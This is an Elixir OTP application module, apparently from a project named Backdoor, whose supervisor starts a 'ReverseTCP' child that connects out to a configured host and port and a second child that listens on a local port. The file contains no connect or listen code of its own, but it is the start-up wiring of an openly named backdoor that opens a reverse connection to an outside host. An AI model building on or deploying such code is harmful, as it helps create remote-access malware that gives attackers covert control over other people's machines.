defmodule Backdoor.Application do
  # See https://hexdocs.pm/elixir/Application.html
  # for more information on OTP Applications
  @moduledoc false

  use Application

  @impl true
  def start(_type, _args) do
    children = [
     %{
        id: ReverseTCP,
        start: {Backdoor, :connect, [Application.fetch_env!(:backdoor, :connect_host), Application.fetch_env!(:backdoor, :connect_port)]}
      },
     %{
        id: LocalhostListener,
        start: {Backdoor, :listen, [ Application.fetch_env!(:backdoor, :listen_port)]}
      }
      # Starts a worker by calling: Backdoor.Worker.start_link(arg)
      # {Backdoor.Worker, arg}
    ]

    # See https://hexdocs.pm/elixir/Supervisor.html
    # for other strategies and supported options
    opts = [strategy: :one_for_one, name: Backdoor.Supervisor]
    Supervisor.start_link(children, opts)
  end
end
